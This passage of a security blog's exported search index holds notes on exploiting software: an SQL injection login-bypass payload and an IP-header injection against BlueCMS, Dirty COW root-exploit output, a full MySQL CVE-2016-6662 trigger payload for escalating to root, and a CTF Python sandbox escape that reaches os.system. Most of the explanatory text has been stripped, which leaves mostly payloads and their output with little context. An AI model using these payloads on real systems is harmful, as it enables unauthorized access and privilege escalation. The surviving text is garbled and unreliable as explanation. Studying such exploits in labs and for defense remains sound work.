intval($_POST[&apos;rememberme&apos;]) : 0;</span><br><span class="line"> if($admin_name == &apos;&apos;)&#123;</span><br><span class="line"> showmsg(&apos;xxx&apos;);</span><br><span class="line"> &#125;</span><br><span class="line"> if($admin_pwd == &apos;&apos;)&#123;</span><br><span class="line"> showmsg(&apos;xxx&apos;);</span><br><span class="line"> &#125;</span><br><span class="line"> if(check_admin($admin_name, $admin_pwd))&#123;</span><br><span class="line"> update_admin_info($admin_name);</span><br><span class="line"> if($remember == 1)&#123;</span><br><span class="line"> setcookie(&apos;Blue[admin_id]&apos;, $_SESSION[&apos;admin_id&apos;], time()+86400);</span><br><span class="line"> setcookie(&apos;Blue[admin_name]&apos;, $admin_name, time()+86400);</span><br><span class="line">setcookie(&apos;Blue[admin_pwd]&apos;, md5(md5($admin_pwd).$_CFG[&apos;cookie_hash&apos;]), time()+86400);</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;else&#123;</span><br><span class="line"> showmsg(&apos;xxx&apos;);</span><br><span class="line"> &#125;</span><br><span class="line"> showmsg(&apos;xxx&apos;, &apos;index.php&apos;);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>check_admin</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function check_admin($name, $pwd)</span><br><span class="line">&#123;</span><br><span class="line">global $db;</span><br><span class="line">$row = $db-&gt;getone(&quot;SELECT COUNT(*) AS num FROM &quot;.table(&apos;admin&apos;).&quot; WHERE admin_name=&apos;$name&apos; and pwd = md5(&apos;$pwd&apos;)&quot;);</span><br><span class="line"> if($row[&apos;num&apos;] &gt; 0)</span><br><span class="line"> &#123;</span><br><span class="line"> return true;</span><br><span class="line"> &#125;</span><br><span class="line"> else</span><br><span class="line"> &#123;</span><br><span class="line"> return false;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user_name=admin%65%27+or+1%3D1%23&amp;pwd=123</span><br></pre></td></tr></table></figure><p><img src="../../../../img/bluecms_code_review/bluecms_login_success.png" alt></p><h2 id="ip"><a href="#ip" class="headerlink" title="ip"></a>ip</h2><p>common.inc.phpgetip()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">function getip()</span><br><span class="line">&#123;</span><br><span class="line">if (getenv(&apos;HTTP_CLIENT_IP&apos;))</span><br><span class="line">&#123;</span><br><span class="line">$ip = getenv(&apos;HTTP_CLIENT_IP&apos;);</span><br><span class="line">&#125;</span><br><span class="line">elseif (getenv(&apos;HTTP_X_FORWARDED_FOR&apos;))</span><br><span class="line">&#123;</span><br><span class="line">$ip = getenv(&apos;HTTP_X_FORWARDED_FOR&apos;);</span><br><span class="line">&#125;</span><br><span class="line">elseif (getenv(&apos;HTTP_X_FORWARDED&apos;))</span><br><span class="line">&#123;</span><br><span class="line">$ip = getenv(&apos;HTTP_X_FORWARDED&apos;);</span><br><span class="line">&#125;</span><br><span class="line">elseif (getenv(&apos;HTTP_FORWARDED_FOR&apos;))</span><br><span class="line">&#123;</span><br><span class="line">$ip = getenv(&apos;HTTP_FORWARDED_FOR&apos;);</span><br><span class="line">&#125;</span><br><span class="line">elseif (getenv(&apos;HTTP_FORWARDED&apos;))</span><br><span class="line">&#123;</span><br><span class="line">$ip = getenv(&apos;HTTP_FORWARDED&apos;);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">$ip = $_SERVER[&apos;REMOTE_ADDR&apos;];</span><br><span class="line">&#125;</span><br><span class="line">return $ip;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br><img src="../../../../img/bluecms_code_review/bluecms_getip.png" alt></p><p>online_ip<br><img src="../../../../img/bluecms_code_review/bluecms_online_ip.png" alt></p><p>guest_book.phpinsertcontentxffclient ip</p><p><img src="../../../../img/bluecms_code_review/bluecms_ip_injection.png" alt><br><br><img src="../../../../img/bluecms_code_review/bluecms_ip_results.png" alt></p><p></p><h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>grep<code>$_GET</code><code>$_POST</code><code>$_REQUEST</code>cmscommon,configbluecmsSQLcms:)</p>]]></content>
      
      
      <categories>
          
          <category> codereview </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cms </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VULNERABLITY</title>
      <link href="2016/12/19/old-old-file-include/"/>
      <url>2016/12/19/old-old-file-include/</url>
      
        <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><p><br><a id="more"></a></p><h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>Web(php)url<br></p><ul><li></li><li></li></ul><p>phpphp23333333<br>ps:</p><h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>RFIRemote File IncludeWeb<br>php<code>allow_url_include=On</code><code>allow_url_fopen=On</code>php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line">fopen()</span><br><span class="line">copy()</span><br><span class="line">file_get_content()</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">include</span>()</span><br><span class="line"><span class="keyword">include_once</span>()</span><br><span class="line"><span class="keyword">require</span>()</span><br><span class="line"><span class="keyword">require_once</span>()</span><br><span class="line"><span class="comment">//email</span></span><br></pre></td></tr></table></figure></p><p><br></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>php<code>http</code><code>https</code>(openssl)<code>ftp</code><code>php://input</code></p>]]></content>
      
      
      <categories>
          
          <category> notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vul </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2016-5195Dirtycow</title>
      <link href="2016/10/26/old-old-dirtycow-cve-2016-5195/"/>
      <url>2016/10/26/old-old-dirtycow-cve-2016-5195/</url>
      
        <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>dirtycow:Linux kernel &gt;= 2.6.2220071018,EXP<br><a id="more"></a></p><h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><h3 id="https-www-exploit-db-com-exploits-40616"><a href="#https-www-exploit-db-com-exploits-40616" class="headerlink" title="https://www.exploit-db.com/exploits/40616/"></a><a href="https://www.exploit-db.com/exploits/40616/" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/40616/</a></h3><p>EXPexploitdbrootshell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">okami@ubuntu14:~$ ./dirtycow</span><br><span class="line">DirtyCow root privilege escalation</span><br><span class="line">Backing up /usr/bin/passwd.. to /tmp/bak</span><br><span class="line">Size of binary: 47032</span><br><span class="line">Racing, this may take a while..</span><br><span class="line">thread stopped</span><br><span class="line">thread stopped</span><br><span class="line">/usr/bin/passwd is overwritten</span><br><span class="line">Popping root shell.</span><br><span class="line">Don&apos;t forget to restore /tmp/bak</span><br><span class="line">root@ubuntu14:/home/okami# id</span><br><span class="line">uid=0(root) gid=1000(okami) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare),1000(okami)</span><br><span class="line">root@ubuntu14:/home/okami# whoami</span><br><span class="line">root</span><br><span class="line">root@ubuntu14:/home/okami#</span><br></pre></td></tr></table></figure><h3 id="https-github-com-scumjr-dirtycow-vdso"><a href="#https-github-com-scumjr-dirtycow-vdso" class="headerlink" title="https://github.com/scumjr/dirtycow-vdso"></a><a href="https://github.com/scumjr/dirtycow-vdso" target="_blank" rel="noopener">https://github.com/scumjr/dirtycow-vdso</a></h3><p>EXPlinuxubuntu14 16 centOS7<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">okami@ubuntu14:~$ ./0xdeadbeef</span><br><span class="line">[*] exploit: patch 1/2</span><br><span class="line">[*] vdso successfully backdoored</span><br><span class="line">[*] exploit: patch 2/2</span><br><span class="line">[*] vdso successfully backdoored</span><br><span class="line">[*] waiting for reverse connect shell...</span><br><span class="line">[*] enjoy!</span><br><span class="line">[*] restore: patch 2/2</span><br><span class="line">[*] vdso successfully restored</span><br><span class="line">[*] restore: patch 1/2</span><br><span class="line">[*] vdso successfully restored</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">lsb_release -a</span><br><span class="line">No LSB modules are available.</span><br><span class="line">Distributor ID:Ubuntu</span><br><span class="line">Description:Ubuntu 14.04.5 LTS</span><br><span class="line">Release:14.04</span><br><span class="line">Codename:trusty</span><br></pre></td></tr></table></figure></p><p>waiting for reverse connect shellrootshell</p>]]></content>
      
      
      <categories>
          
          <category> notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cve </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2016-6662MYSQL</title>
      <link href="2016/09/18/old-old-cve-2016-6663-mysql-exp/"/>
      <url>2016/09/18/old-old-cve-2016-6663-mysql-exp/</url>
      
        <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>mysql0day</p><a id="more"></a><h1 id=""><a href="#" class="headerlink" title=""></a></h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MySQL  &lt;= 5.7.15       /  (0day)</span><br><span class="line">        5.6.33</span><br><span class="line">        5.5.52</span><br><span class="line"></span><br><span class="line">Mysql,</span><br><span class="line">    MariaDB</span><br><span class="line">    PerconaDB</span><br></pre></td></tr></table></figure><h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>dockerpull<a href="https://hub.docker.com/r/0kami/vulevn/tags/" target="_blank" rel="noopener">0kami/vulenv:cve-2016-6663</a><br>attacker<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql file bob/bob</span><br><span class="line">exp mysql_hookandroot_lib.c</span><br><span class="line">mysql-server-5.6</span><br><span class="line">my.cnfmysql</span><br></pre></td></tr></table></figure></p><p><br><img src="../../../../img/cve-2016-6662/pic1.png" alt><br><code>/etc/mysql/my.cnf</code><br><img src="../../../../img/cve-2016-6662/pic2.png" alt><br>bobfileselectinsertactivedbactive_table<br><img src="../../../../img/cve-2016-6662/pic3.png" alt><br><img src="../../../../img/cve-2016-6662/pic4.png" alt><br>exptmpsoipportmy.cnf<br><img src="../../../../img/cve-2016-6662/pic5.png" alt><br><code>gcc -Wall -fPIC -shared -o mysql_hookandroot_lib.c.so mysql_hookandroot_lib.c.c -ldl</code><br><img src="../../../../img/cve-2016-6662/pic6.png" alt><br>active_tableroottragger<br><img src="../../../../img/cve-2016-6662/pic7.png" alt><br>activedb<br><img src="../../../../img/cve-2016-6662/pic8.png" alt><br>bobshell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &quot;TYPE=TRIGGERS\ntriggers=&apos;CREATE DEFINER=`root`@`localhost` TRIGGER active_table\nAFTER INSERT\n   ON `active_table` FOR EACH ROW\nBEGIN\n   DECLARE void varchar(550);\n   set global general_log_file=\\\&apos;/etc/mysql/my.cnf\\\&apos;;\n   set global general_log = on;\n   select \&quot;\n[mysqld]\nmalloc_lib=\\\&apos;/tmp/mysql_hookandroot_lib.so\\\&apos;\n\&quot; INTO void;   \n   set global general_log = off;\nEND&apos;\nsql_modes=1073741824\ndefiners=&apos;root@localhost&apos;\nclient_cs_names=&apos;latin1&apos;\nconnection_cl_names=&apos;latin1_swedish_ci&apos;\ndb_cl_names=&apos;latin1_swedish_ci&apos;&quot; into dumpfile &apos;/var/lib/mysql/activedb/active_table.TRG&apos;;</span><br></pre></td></tr></table></figure></p><p>bobinsert<br><img src="../../../../img/cve-2016-6662/pic9.png" alt><br><code>/etc/mysql/my.cnf</code><br><img src="../../../../img/cve-2016-6662/pic10.png" alt><br>shell<br>my.cnf5.5my.cnf744<br><img src="../../../../img/cve-2016-6662/pic11.png" alt><br><img src="../../../../img/cve-2016-6662/pic12.png" alt><br>shellshellmysql mysqld_safemysqlmysqlmysqld_saferootshellroot</p><h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>my.cnftriggersfile</p>]]></content>
      
      
      <categories>
          
          <category> notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cve </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VULNERABLITYpython sandbox escape</title>
      <link href="2016/09/16/old-old-python-sandbox-escape/"/>
      <url>2016/09/16/old-old-python-sandbox-escape/</url>
      
        <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>python</p><a id="more"></a><h1 id=""><a href="#" class="headerlink" title=""></a></h1><p><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"></span><br><span class="line">print(<span class="string">"Welcome to my Python sandbox! Enter commands below!"</span>)</span><br><span class="line"></span><br><span class="line">banned = [  </span><br><span class="line">    <span class="string">"import"</span>,</span><br><span class="line">    <span class="string">"exec"</span>,</span><br><span class="line">    <span class="string">"eval"</span>,</span><br><span class="line">    <span class="string">"pickle"</span>,</span><br><span class="line">    <span class="string">"os"</span>,</span><br><span class="line">    <span class="string">"subprocess"</span>,</span><br><span class="line">    <span class="string">"kevin sucks"</span>,</span><br><span class="line">    <span class="string">"input"</span>,</span><br><span class="line">    <span class="string">"banned"</span>,</span><br><span class="line">    <span class="string">"cry sum more"</span>,</span><br><span class="line">    <span class="string">"sys"</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">targets = __builtins__.__dict__.keys()  </span><br><span class="line">targets.remove(<span class="string">'raw_input'</span>)  </span><br><span class="line">targets.remove(<span class="string">'print'</span>)  </span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> targets:<span class="comment"># print raw_input</span></span><br><span class="line">    <span class="keyword">del</span> __builtins__.__dict__[x]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:  </span><br><span class="line">    print(<span class="string">"&gt;&gt;&gt;"</span>, end=<span class="string">' '</span>)</span><br><span class="line">    data = raw_input()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> no <span class="keyword">in</span> banned:</span><br><span class="line">        <span class="keyword">if</span> no.lower() <span class="keyword">in</span> data.lower():</span><br><span class="line">            print(<span class="string">"No bueno"</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>: <span class="comment"># this means nobreak</span></span><br><span class="line">        <span class="keyword">exec</span> data</span><br></pre></td></tr></table></figure></p><p>bannedflag</p><h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>payload</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; [].__class__</span><br><span class="line">&lt;type &apos;list&apos;&gt;</span><br><span class="line">&gt;&gt;&gt; &#123;&#125;.__class__</span><br><span class="line">&lt;type &apos;dict&apos;&gt;</span><br><span class="line">&gt;&gt;&gt; ().__class__</span><br><span class="line">&lt;type &apos;tuple&apos;&gt;</span><br></pre></td></tr></table></figure><p>python<strong>class</strong><strong>base</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#123;&#125;.__class__.__base__</span><br><span class="line">&lt;type &apos;object&apos;&gt;</span><br><span class="line">&gt;&gt;&gt; ().__class__.__base__</span><br><span class="line">&lt;type &apos;object&apos;&gt;</span><br><span class="line">&gt;&gt;&gt; [].__class__.__base__</span><br><span class="line">&lt;type &apos;object&apos;&gt;</span><br></pre></td></tr></table></figure></p><p>objectpythonobjectobject<strong>subclasses</strong>object<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; [].__class__.__base__.__subclasses__()</span><br><span class="line">[&lt;type &apos;type&apos;&gt;, &lt;type &apos;weakref&apos;&gt;, &lt;type &apos;weakcallableproxy&apos;&gt;, &lt;type &apos;weakproxy&apos;&gt;, &lt;type &apos;int&apos;&gt;, &lt;type &apos;basestring&apos;&gt;, &lt;type &apos;bytearray&apos;&gt;, &lt;type &apos;list&apos;&gt;, &lt;type &apos;NoneType&apos;&gt;, &lt;type &apos;NotImplementedType&apos;&gt;, &lt;type &apos;traceback&apos;&gt;, &lt;type &apos;super&apos;&gt;, &lt;type &apos;xrange&apos;&gt;, &lt;type &apos;dict&apos;&gt;, &lt;type &apos;set&apos;&gt;, &lt;type &apos;slice&apos;&gt;, &lt;type &apos;staticmethod&apos;&gt;, &lt;type &apos;complex&apos;&gt;, &lt;type &apos;float&apos;&gt;, &lt;type &apos;buffer&apos;&gt;, &lt;type &apos;long&apos;&gt;, &lt;type &apos;frozenset&apos;&gt;, &lt;type &apos;property&apos;&gt;, &lt;type &apos;memoryview&apos;&gt;, &lt;type &apos;tuple&apos;&gt;, &lt;type &apos;enumerate&apos;&gt;, &lt;type &apos;reversed&apos;&gt;, &lt;type &apos;code&apos;&gt;, &lt;type &apos;frame&apos;&gt;, &lt;type &apos;builtin_function_or_method&apos;&gt;, &lt;type &apos;instancemethod&apos;&gt;, &lt;type &apos;function&apos;&gt;, &lt;type &apos;classobj&apos;&gt;, &lt;type &apos;dictproxy&apos;&gt;, &lt;type &apos;generator&apos;&gt;, &lt;type &apos;getset_descriptor&apos;&gt;, &lt;type &apos;wrapper_descriptor&apos;&gt;, &lt;type &apos;instance&apos;&gt;, &lt;type &apos;ellipsis&apos;&gt;, &lt;type &apos;member_descriptor&apos;&gt;, &lt;type &apos;file&apos;&gt;, &lt;type &apos;PyCapsule&apos;&gt;, &lt;type &apos;cell&apos;&gt;, &lt;type &apos;callable-iterator&apos;&gt;, &lt;type &apos;iterator&apos;&gt;, &lt;type &apos;sys.long_info&apos;&gt;, &lt;type &apos;sys.float_info&apos;&gt;, &lt;type &apos;EncodingMap&apos;&gt;, &lt;type &apos;fieldnameiterator&apos;&gt;, &lt;type &apos;formatteriterator&apos;&gt;, &lt;type &apos;sys.version_info&apos;&gt;, &lt;type &apos;sys.flags&apos;&gt;, &lt;type &apos;exceptions.BaseException&apos;&gt;, &lt;type &apos;module&apos;&gt;, &lt;type &apos;imp.NullImporter&apos;&gt;, &lt;type &apos;zipimport.zipimporter&apos;&gt;, &lt;type &apos;posix.stat_result&apos;&gt;, &lt;type &apos;posix.statvfs_result&apos;&gt;, &lt;class &apos;warnings.WarningMessage&apos;&gt;, &lt;class &apos;warnings.catch_warnings&apos;&gt;, &lt;class &apos;_weakrefset._IterationGuard&apos;&gt;, &lt;class &apos;_weakrefset.WeakSet&apos;&gt;, &lt;class &apos;_abcoll.Hashable&apos;&gt;, &lt;type &apos;classmethod&apos;&gt;, &lt;class &apos;_abcoll.Iterable&apos;&gt;, &lt;class &apos;_abcoll.Sized&apos;&gt;, &lt;class &apos;_abcoll.Container&apos;&gt;, &lt;class &apos;_abcoll.Callable&apos;&gt;, &lt;type &apos;dict_keys&apos;&gt;, &lt;type &apos;dict_items&apos;&gt;, &lt;type &apos;dict_values&apos;&gt;, &lt;class &apos;site._Printer&apos;&gt;, &lt;class &apos;site._Helper&apos;&gt;, &lt;type &apos;_sre.SRE_Pattern&apos;&gt;, &lt;type &apos;_sre.SRE_Match&apos;&gt;, &lt;type &apos;_sre.SRE_Scanner&apos;&gt;, &lt;class &apos;site.Quitter&apos;&gt;, &lt;class &apos;codecs.IncrementalEncoder&apos;&gt;, &lt;class &apos;codecs.IncrementalDecoder&apos;&gt;]</span><br></pre></td></tr></table></figure></p><p>flagfilefile<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; [].__class__.__base__.__subclasses__().index(file)</span><br><span class="line">40</span><br></pre></td></tr></table></figure></p><p>file<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; f=[].__class__.__base__.__subclasses__()[40]</span><br><span class="line">&gt;&gt;&gt; f(&apos;./flag.txt&apos;).read()</span><br></pre></td></tr></table></figure></p><p>flag.txtprint<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print(f(&apos;./flag.txt&apos;).read())</span><br><span class="line">This is a Flag&#123;enjoy_yourself_ctfer&#125;</span><br></pre></td></tr></table></figure></p><p>flag</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>ossystemos<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import os</span><br><span class="line">No bueno</span><br></pre></td></tr></table></figure></p><p>shellos<code>warnings.catch_warnings</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import warnings</span><br><span class="line">&gt;&gt;&gt; [].__class__.__base__.__subclasses__().index(warnings.catch_warnings)</span><br><span class="line">59</span><br><span class="line">&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59]</span><br><span class="line">&lt;class &apos;warnings.catch_warnings&apos;&gt;</span><br><span class="line">&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.func_globals.keys()</span><br><span class="line">[&apos;filterwarnings&apos;, &apos;once_registry&apos;, &apos;WarningMessage&apos;, &apos;_show_warning&apos;, &apos;filters&apos;, &apos;_setoption&apos;, &apos;showwarning&apos;, &apos;__all__&apos;, &apos;onceregistry&apos;, &apos;__package__&apos;, &apos;simplefilter&apos;, &apos;default_action&apos;, &apos;_getcategory&apos;, &apos;__builtins__&apos;, &apos;catch_warnings&apos;, &apos;__file__&apos;, &apos;warnpy3k&apos;, &apos;sys&apos;, &apos;__name__&apos;, &apos;warn_explicit&apos;, &apos;types&apos;, &apos;warn&apos;, &apos;_processoptions&apos;, &apos;defaultaction&apos;, &apos;__doc__&apos;, &apos;linecache&apos;, &apos;_OptionError&apos;, &apos;resetwarnings&apos;, &apos;formatwarning&apos;, &apos;_getaction&apos;]</span><br></pre></td></tr></table></figure></p><p><code>linecache</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.func_globals.keys().index(&apos;linecache&apos;)</span><br><span class="line">25</span><br><span class="line">&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__.keys()</span><br><span class="line">[&apos;updatecache&apos;, &apos;clearcache&apos;, &apos;__all__&apos;, &apos;__builtins__&apos;, &apos;__file__&apos;, &apos;cache&apos;, &apos;checkcache&apos;, &apos;getline&apos;, &apos;__package__&apos;, &apos;sys&apos;, &apos;getlines&apos;, &apos;__name__&apos;, &apos;os&apos;, &apos;__doc__&apos;]</span><br></pre></td></tr></table></figure></p><p>ossystem<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__.values()[12]</span><br><span class="line">&lt;module &apos;os&apos; from &apos;/usr/lib/python2.7/os.pyc&apos;&gt;</span><br><span class="line">&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__.values()[12].__dict__.keys().index(&apos;system&apos;)</span><br><span class="line">144</span><br></pre></td></tr></table></figure></p><p><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; a=[].__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__.values()[12]</span><br><span class="line">&gt;&gt;&gt; a</span><br><span class="line">&lt;module &apos;os&apos; from &apos;/usr/lib/python2.7/os.pyc&apos;&gt;</span><br><span class="line">&gt;&gt;&gt; s=a.__dict__.keys().index(&apos;system&apos;)</span><br><span class="line">&gt;&gt;&gt; s</span><br><span class="line">144</span><br><span class="line">&gt;&gt;&gt; s=a.__dict__.keys()[144]</span><br><span class="line">&gt;&gt;&gt; s</span><br><span class="line">&apos;system&apos;</span><br><span class="line">&gt;&gt;&gt; s=a.__dict__.values()[144]</span><br><span class="line">&gt;&gt;&gt; s(&apos;pwd&apos;)</span><br><span class="line">/home/xxxx/Desktop/code/python-code/test</span><br></pre></td></tr></table></figure></p><p>catflag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s(&apos;cat flag.txt&apos;)</span><br><span class="line">This is a Flag&#123;enjoy_yourself_ctfer&#125;</span><br></pre></td></tr></table></figure></p><h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>pythonpython</p><h1 id=""><a href="#" class="headerlink" title=""></a></h1><p><a href="https://hexplo.it/escaping-the-csawctf-python-sandbox/" target="_blank" rel="noopener">https://hexplo.it/escaping-the-csawctf-python-sandbox/</a></p>]]></content>
      
      
      <categories>
          
          <category> notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vul </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MOBILEhow to install drozer on mac</title>
      <link href="2016/08/20/old-old-how-to-install-drozer-on-mac/"/>
